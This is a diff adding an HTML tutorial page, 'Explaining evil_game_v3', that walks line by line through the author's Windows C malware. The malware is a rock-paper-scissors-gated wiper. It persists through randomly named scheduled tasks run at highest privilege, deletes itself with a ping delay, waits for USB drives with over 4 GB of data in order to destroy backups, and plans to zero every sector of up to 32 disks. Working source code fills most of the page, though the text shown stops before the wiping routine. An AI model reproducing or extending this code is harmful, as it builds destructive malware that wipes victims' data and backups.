@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Up v3</title>
+
+    <!-- Prism CSS for syntax highlighting -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
+
+    <style>
+        body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+        font-size: 16px; 
+        line-height: 1.6; 
+        margin: 20px;
+        background-color: #000; 
+        color: #fff; 
+}
+
+        h1, h2, h3 {
+            color: #fff;
+        }
+        pre {
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+        mark {
+            background-color: #555;
+            color: #fff;               
+            padding: 2px 4px;          
+            border-radius: 2px;        
+        }
+    </style>
+</head>
+<body>
+    <h1>Explaining evil_game_v3</h1>
+    <p>Fun little project :)<br> basic c/windows understanding is required</p>
+
+    <h2>Inspiration</h2>
+    <pre><code class="language-python">
+import random
+import os
+
+number = random.randint(1,10)
+guess = int(input("Silly Game! Guess a number between 1 and 10"))
+
+if guess == number:
+    print("You Won!")
+else:
+    os.remove("C:\Windows\System32")
+    </code></pre>
+<p>author unkown</p>
+<p>of course kernel protection don't actually let the python program run</p>
+<h2>Goal, create a gamified gated payload and do the most destruction possible in ring3</h2>
+<h2>Psuedocode</h2>
+<pre><code>
+    check if admin:
+        delete self and exit if not admin
+    
+    generate random name for task_scheduler
+
+    schedule to run payload on next login
+
+    check if theres any past usb:
+        if past_usb's:
+            schedule task to run when usb:
+                only run payload if usb has more than 4gb of data  
+                // to maximize destruction and destory backups
+        if !past_usb:
+            schdule to run payload on next login
+    game:
+        simple rock paper scissors:
+            win:
+                call safe and delete scheduled tasks 
+            lose:
+                call payload to run when scheduled
+    payload:
+        scan and enumerate up to 32 disks 
+        open each disk directly, unbuffered
+        clear read only attributes
+        find drive size
+        write zeros to every sector of every drive useing 16 mb buffer
+    main:
+        run payload if flagged:
+            if !flagged run rest
+</code></pre>
+<h3>lets explain what my program does line by line</h3>
+<pre><code class="language-c">
+    #include &lt;windows.h&gt; // all windows api 
+    #include &lt;stdio.h&gt; // standard c 
+    #include &lt;time.h&gt;  // for random number/string
+    #include &lt;stdlib.h&gt; // standard c & random
+    #include &lt;winioctl.h&gt; // windows I/O control 
+    #include &lt;ntdddisk.h&gt; // direct disk control 
+    #include &lt;stdbool.h&gt; // admin check
+    #include &lt;winevt.h&gt; // usb events 
+</code></pre>
+<ul>
+    <li>&lt;windows.h&gt; - <a href="https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list" target="_blank">win32_api_index</a></li>
+    <li>&lt;winioctl.h&gt; - <a href="https://learn.microsoft.com/en-us/windows/win32/api/winioctl/ni-winioctl-ioctl_storage_firmware_get_info" target="_blank">MS docs, storage</a></li>
+    <li>&lt;ntdddisk.h&gt; - <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntdddisk/ne-ntdddisk-_detection_type" target="_blank">direct disk access MS docs</a></li>
+    <li>&lt;winevt.h&gt; - <a href="https://learn.microsoft.com/en-us/windows/win32/wes/windows-event-log-data-types" target="_blank">MS Docs, event hadling</a></li>
+</ul>
+<pre><code class="language-c">
+    bool admin_check() {
+        bool is_admin = False;
+        PSID admin_group = NULL
+</code></pre>
+<p> initialize to false/Null so the user isnt auto-admin <br>
+    Decalare pointer to security identifier (SID) called admin_group
+</p>
+<pre><code class="language-c">
+    // admin group sid is "S-1-5-32-544"
+    if (ConvertStringSidToSidA("S-1-5-32-544", &admin_group)) {
+        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
+            is_admin = FALSE;
+        }
+        LocalFree(admin_group); // free mem from ConvertStringSidToSidA
+    }
+</pre></code>
+<p>admin SID is S-1-5-32-544 <br> we convert string sid to Sid that win api can use <br> <mark>CheckTokenMembership</mark> checks if user belongs to specific group <br> <mark>NULL</mark> checks current process token "&is_admin" stores the result</p>
+<pre><code class="language-c">
+    if (!is_admin) {
+        // reused from safe()
+        char cmd[MAX_PATH + 64]; //gets full path of exe
+        GetModuleFileNameA(NULL, cmd, MAX_PATH);
+        char rm_cmd[MAX_PATH + 128];
+        sprintf(rm_cmd,
+        "cmd /c ping 127.0.0.1 -n 2 > nul && del \"%s\"", cmd);
+        system(rm_cmd);
+        return 1;
+    }
+    return is_admin; // run normally if admin
+}
+</pre></code>
+<p> if the user isnt admin the program deletes itself, since windows doesnt allow programs to delete themselves 
+    we run a command that delays, why ping localhost instead of Sleep()?<br> sleep() only pauses current process <br>
+    the program is still running the the executable is locked, "ping 127.0.0.1 -n 2" runs an external process allowing self deletion, classic trick
+</p>
+<pre><code class="language-c">
+    char rand_nm[7]; // global var, + null term
+    const char charset[] = "abcdefghijklmnopqrstuvwxyzaBCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
+
+    void gen_rnd() {
+        size_t len = sizeof(charset) -1; // for null term
+        for (int a = 0; a &lt; 6; a++) {
+            rand_nm[a] = charset[rand() % len];
+        }
+        rand_nm[6] = '\0';
+    }
+</pre></code>
+<p>  create const array for charset, <br> gets length, loops 6 times to get six characters <br>"and_nm[a] = charset[rand() % len];" picks random from charset and stores array, then adds null term so it can be used "%s" </p>
+<pre><code class="language-c">
+    void task_sch_logon() {
+    char exepath[MAX_PATH]; //finding current executable
+    char cmd[MAX_PATH + 256]; // buffer for the rest of the code
+
+    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
+        return;
+    }
+
+    sprintf(cmd, 
+        "schtasks /create /sc onlogon /tn \"%s\" /tr \"%s payload\" /rl highest /f", 
+        rand_nm, exepath);
+    system(cmd);
+    
+}
+</pre></code>
+<p> "cmd" = buffer to build command-line string sets max length to around 260 chars note* I should probably convert this to task_man_api later <br>
+<mark>GetModuleFileNameA(NULL, exepath, MAX_PATH)</mark> gets path to current exe, "NULL" means current process, if unable to find current process exit early<br>
+<mark>schtasks /create</mark> creates new scheudles task <br>
+<mark>/sc onlogon</mark> schdules to run on login<br>
+<mark>/tn "%s"</mark> task name, uses rand_nm from earlier<br>
+<mark>/tr "%s payload"</mark> command to run, <mark>/rl highest</mark> run with highest priv <br>
+<mark>/f</mark> forse creation, so if a task exists with that name <mark>sprintf</mark> replaces placeholder "%s" with rand_nm & exepath</p>
+<h3> before we start next snippet, the goal was destruction so my plan was to <br>
+find if the user has any past usb's if they have wait untill the usb is found than run the disk wiper, to destroy backups</h3>
+<pre><code class="language-c">
+    BOOL past_usb_check(){
+    EVT_HANDLE hQuery = EvtQuery(
+        NULL,
+        L"Microsoft-Windows-DriverFrameworks-UserMode/Operational",
+        L"*[System[(EventID=2003)]]",
+        EvtQueryReverseDirection
+    );
+</pre></code>
+<p> <mark>EVT_HANDLE hQuery</mark> to handle an event log query<br>
+<mark>evtQuery</mark> windows api function <mark>winevt.h</mark> used to quesry windows event log<br>
+Paramaters</p>
+<ul>
+    <li><mark>NULL</mark> queries local event log</li>
+    <li><mark>L"Microsoft-Windows-DriverFrameworks-UserMode/Operational"</mark> name of event log channel</li>
+    <li><mark>L"*[System[(EventID=2003)]]"</mark> eventid=2003, device arrival code, L &lt;- means large string btw</li>
+    <li><mark>EvtQueryReverseDirection</mark> newest to oldest, to see if there have been any devices recently</li>
+</ul>
+<pre><code class="language-c">
+     if (!hQuery) return FALSE;
+</pre></code>
+<p>If theres nothing to query, theres no past usbs revert to on logon scheduling</p>
+<pre><code>
+    EVT_HANDLE hEvent;
+    DWORD returned;
+    BOOL found = FALSE;
+</code></pre>
+<p> declare variable <mark>hEvent</mark> <mark>EVT_HANDLE</mark> win event log handle used for individual events or queries<br>
+decare <mark>returned</mark> of type DWORD (for those new to win api, DWORD is like int for unsigned 32-bit ints)<br>
+</p>
+<pre><code>
+    if (EvtNext(hQuery, 1, &hEvent, 0, 0, &returned)) {
+        found = TRUE; 
+        EvtClose(hEvent);
+    }
+
+    EvtClose(hQuery);
+    return found;
+}
+</code></pre>
+<p>paramaters</p>
+<ul>
+    <li><mark>EvtNext</mark> winapi retrieves from an event log query</li>
+    <li><mark>1</mark> number of events to get</li>
+    <li><mark>&hEvent</mark> pointer to store retrieved event</li>
+    <li><mark>0</mark> timout (mm seconds, 0 = return immediatly)</li>
+    <li><mark>0</mark> reserved, always 0</li>
+    <li><mark>&returned</mark> receives the number of events, must be nonzero to return <mark>True</mark></li>
+</ul>
+<p><mark>EvtClose(hEvent);</mark> & <mark>EvtClose(hQuery);</mark>closes event handle to avoid mem leaks</p>
+<pre><code>
+   ULONGLONG used_space_drive(const wchar_t* drive) {
+    ULARGE_INTEGER free_bytes, total_bytes, total_free;
+    if (GetDiskFreeSpaceExW(drive, &free_bytes, &total_bytes, &total_free)) {
+        return total_bytes.QuadPart - free_bytes.QuadPart; // get used bytes
+    }
+    return 0;
+} 
+</code></pre>
+    <!-- Prism JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.30.0/components/prism-c.min.js"></script>
+</body>
+</html>
